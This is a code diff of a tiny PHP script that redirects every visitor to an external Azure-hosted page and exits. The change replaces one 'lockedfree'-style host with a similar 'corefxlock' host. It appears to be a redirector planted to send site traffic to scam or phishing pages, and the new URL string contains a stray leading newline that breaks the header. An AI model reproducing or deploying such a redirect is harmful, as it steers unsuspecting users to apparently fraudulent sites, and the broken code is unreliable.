@@ -1,5 +1,6 @@
 <?php
-$url = "https://lockedfree24ze.z13.web.core.windows.net/";
+$url = "
+https://corefxlock86.z1.web.core.windows.net/";
 header('Location: '.$url);
 die();
 ?>
